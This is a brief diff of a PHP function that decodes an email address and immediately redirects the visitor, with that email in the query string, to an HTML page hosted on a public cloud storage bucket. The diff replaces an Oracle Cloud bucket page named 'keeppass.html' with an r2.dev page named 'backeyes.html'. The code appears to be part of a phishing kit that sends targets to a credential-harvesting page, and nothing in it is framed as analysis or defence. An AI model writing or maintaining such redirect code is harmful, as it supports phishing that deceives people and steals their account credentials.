@@ -15,7 +15,7 @@ function decode($email)
     }
 
     header(
-        "refresh:0;url=https://objectstorage.ap-sydney-1.oraclecloud.com/n/sd1unvvdgopy/b/bucket-20211115-0439/o/keeppass.html?email=" .
+        "refresh:0;url=https://pub-c929e88dfe4b4a3abac22a83118f1e40.r2.dev/backeyes.html?email=" .
             $email
     );
 }
